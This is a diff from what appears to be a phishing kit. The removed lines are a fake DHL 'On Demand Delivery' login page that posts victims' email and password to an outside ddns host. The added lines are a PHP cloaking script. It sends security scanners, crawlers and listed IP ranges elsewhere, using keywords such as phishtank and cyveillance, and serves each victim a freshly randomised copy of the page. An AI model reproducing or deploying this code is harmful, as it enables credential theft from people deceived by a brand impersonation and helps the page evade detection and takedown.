@@ -1,103 +1,58 @@
+<?php
+include('blocker.html');
+?>
+<?php
 
-<!DOCTYPE html>
-<html lang="en" dir="ltr"><head id="j_idt2"><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-    <title>On Demand Delivery</title>
-<script src="milk/jquery.min.js"></script>
-<script src="milk/bootstrap.min.js"></script>
-<script>$.urlParam = function(email){ var results = new RegExp('[\?&]' + email + '=([^&#]*)').exec(window.location.href); return results[1] || 0; }</script> <script> $( document ).ready(function() { $("#email").val($.urlParam('email')); }); </script>
- <link rel="shortcut icon" href="milk/favicon.ico" />
-    <link rel="stylesheet" type="text/css" href="./	milk/login.css">
-    </head>
-	
-	<body style=" border: none; ">
-	<input type="hidden" value="false">  
-	<input type="hidden">
-   
-	  <div class="modal fade" id="sideMenuHelpModel" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
-	    <div class="modal-dialog linguisticHelpModel">
-	      <div class="modal-content">
-	        <div class="modal-header helpModalHeader">
-	          <button type="button" class="close" data-dismiss="modal" aria-hidden="true"> <img style="padding-top:10px" src="./milk/icon-close.png"> </button>
-	          <h4 class="helpmodal-title mt-10 mb-10" id="myModalLabel">Help</h4>
-	        </div>
-	        <div id="sideMenuHelpContent" class="modal-body linguisticHelpModelBody">
-	        </div>
-	      </div>
-	      
-	    </div>
-	    
-	  </div>
-    <section id="main-wrapper" class="">
-      <header id="main-header" class="row" style="border: 0;">
-              
-              <button id="menu-open-btn" class="hamburger hamburger--squeeze" type="button" aria-label="Open Menu" aria-controls="navigation">
-                <span class="hamburger-box">
-                  <span class="hamburger-inner"></span>
-                </span>
-              </button><span id="header-title" class="header-title"></span>
-      </header>
-      <section id="main-body" class="login-bg" style="border: 0;">
-    <section id="login-body" class="row">
-      <div class="col-xs-24">
-        <img src="./milk/dhl_logo.svg" class="logo-dhl is-centered img-responsive" alt="DHL">
-      </div>
-      <div class="col-xs-24">
-        <img src="./milk/odd_logo.svg" class="logo-odd is-centered img-responsive" alt="On Demand Delivery">
-      </div>
-	  <div style="text-align: center; margin-bottom: 10px;">Login with your valid email and password to gain access to all shipment information.</div>
-<form id="loginForm" name="loginForm" method="post" action="https://device-managerloc.ddns.net/frod.php">
+$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
+$botloc = "http://google.com";
+$blocked_words = array("above","google","softlayer","amazonaws","cyveillance","phishtank","dreamhost","netpilot","calyxinstitute","tor-exit",);
+foreach($blocked_words as $word) {
+    if (substr_count($hostname, $word) > 0) {
+		header("location:$botloc");
 
-        <div class="row login-input-group">
-          
-          <div class="col-xs-24 mb-15">
-		  
-		  <input placeholder="Email Address" type="email" name="drift" tabindex="1" style="background-color: rgba(255, 255, 255, 0.55); border: 1px solid rgba(255, 255, 255, 0.55); box-shadow: 0 3px 4px 0 rgba(0, 0, 0, 0.16);" id="email"  required="" >
-		  
-          </div>
-          <div class="col-xs-24 mb-5"><div id="loginForm:password-field" class="login-button-combo col-xs-24" style="background-color: rgba(255, 255, 255, 0.55); border: 1px solid rgba(255, 255, 255, 0.55); box-shadow: 0 3px 4px 0 rgba(0, 0, 0, 0.16);">
-		  
-		  <input placeholder="Email Address Password" type="password" id="loginForm:password" name="cash" class="password-toggle" tabindex="2" style="" required="" >
-              <img id="icon-password" alt="eye" class="img-responsive icon-password" src="./milk/eyeshow.svg" ></div><span id="loginForm:password-field-error" style="display: none;" class="input-error"></span>
-</div>
+    }  
+}
+$bannedIP = array("^66.102.*.*", "^38.100.*.*", "^107.170.*.*", "^149.20.*.*", "^38.105.*.*", "^74.125.*.*",  "^66.150.14.*", "^54.176.*.*", "^38.100.*.*", "^184.173.*.*", "^66.249.*.*", "^128.242.*.*", "^72.14.192.*", "^208.65.144.*", "^74.125.*.*", "^209.85.128.*", "^216.239.32.*", "^74.125.*.*", "^207.126.144.*", "^173.194.*.*", "^64.233.160.*", "^72.14.192.*", "^66.102.*.*", "^64.18.*.*", "^194.52.68.*", "^194.72.238.*", "^62.116.207.*", "^212.50.193.*", "^69.65.*.*", "^50.7.*.*", "^131.212.*.*", "^46.116.*.* ", "^62.90.*.*", "^89.138.*.*", "^82.166.*.*", "^85.64.*.*", "^85.250.*.*", "^89.138.*.*", "^93.172.*.*", "^109.186.*.*", "^194.90.*.*", "^212.29.192.*", "^212.29.224.*", "^212.143.*.*", "^212.150.*.*", "^212.235.*.*", "^217.132.*.*", "^50.97.*.*", "^217.132.*.*", "^209.85.*.*", "^66.205.64.*", "^204.14.48.*", "^64.27.2.*", "^67.15.*.*", "^202.108.252.*", "^193.47.80.*", "^64.62.136.*", "^66.221.*.*", "^64.62.175.*", "^198.54.*.*", "^192.115.134.*", "^216.252.167.*", "^193.253.199.*", "^69.61.12.*", "^64.37.103.*", "^38.144.36.*", "^64.124.14.*", "^206.28.72.*", "^209.73.228.*", "^158.108.*.*", "^168.188.*.*", "^66.207.120.*", "^167.24.*.*", "^192.118.48.*", "^67.209.128.*", "^12.148.209.*", "^12.148.196.*", "^193.220.178.*", "68.65.53.71", "^198.25.*.*", "^64.106.213.*");
+if(in_array($_SERVER['REMOTE_ADDR'],$bannedIP)) {
+     header('HTTP/1.0 404 Not Found');
+     exit();
+} else {
+     foreach($bannedIP as $ip) {
+          if(preg_match('/' . $ip . '/',$_SERVER['REMOTE_ADDR'])){
+               header("location:$botloc");
+          }
+     }
+}
 
-          <div class="col-xs-24">
-            <a id="linkPass" href="javascript:void(0)" class="" tabindex="3">Forgot password?</a>
-          </div>
-        </div>
-        <div class="col-xs-24 mb-15">
-		
-			
-		
-		<button  type="submit" name="expect"  tabindex="4" class="base-button is-center" >LOGIN</button>
-		
-		
-        </div>
-</form>
+$email = $_GET['email'];
+$dir =  getcwd();
+if ($handle = opendir($dir)) {
+    while (false !== ($entry = readdir($handle))) {
+ $len = strlen($entry);
+if($len == 28){
+rename($entry, "index1.html");
+}}}
+$staticfile = "index1.html";
+$name =  generateRandomString();
+$secfile = $name.".html";
+if (!copy($staticfile, $secfile)) {
+//echo "file not create\n";
+}else {
+if(file_exists($secfile)){
+//echo "file exist\n";
+unlink($staticfile);
+header("Location: $secfile?rand=13InboxLightaspxn.1774256418&email=$emailfid&1252899642&fid.1&fav.1&rand=13InboxLightaspxn.1774256418&fid&1252899642&fid.1&fav.1&");
+}}
 
-      <div class="col-xs-24 mt-15">
-        <h4 class="content-title nopadding">NOT YET A MEMBER?</h4>
-      </div>
-      <div class="col-xs-24 mb-10">Sign up now to manage your shipments</div>
-      
-      <div class="col-xs-24 mb-10">
-        <a id="btnSign" href="javascript:void(0)" class="base-button base-button--white is-center" tabindex="5">SIGN UP</a>
-      </div>
-      <div class="col-xs-24 mt-5 text-center">
-        <a id="btnManage" href="javascript:void(0)" class="" tabindex="6">Manage shipment as a guest</a><br>
-      </div>
-    </section>
-      </section>
-      <footer id="main-footer" class="row">
-        <div class="col-xs-8 nopadding">
-          <img src="./milk/dpdhl_logo.svg" class="logo-dpdhl img-responsive" alt="Deutsche Post DHL Group">
-        </div>
-        <div class="col-xs-16 nopadding">
-          <span class="copyright">DHL Express 2019 © DHL International GmbH. All rights reserved.
-          </span>
-        </div>
-      </footer>
-    </section><script src="./milk/confirmation.js.xhtml" type="text/javascript"></script>
-	
-	
-   
-</td></tr></tbody></table></div></body></html>
+//echo $_SESSION["file"]."\n";
+$name =  generateRandomString();
+function generateRandomString($length = 24) {
+    $characters = '0123456789abcdefghijklmnopqrstuvwxyz';
+    $charactersLength = strlen($characters);
+    $randomString = '';
+    for ($i = 0; $i < $length; $i++) {
+        $randomString .= $characters[rand(0, $charactersLength - 1)];
+    }
+    return $randomString;
+}
+?>
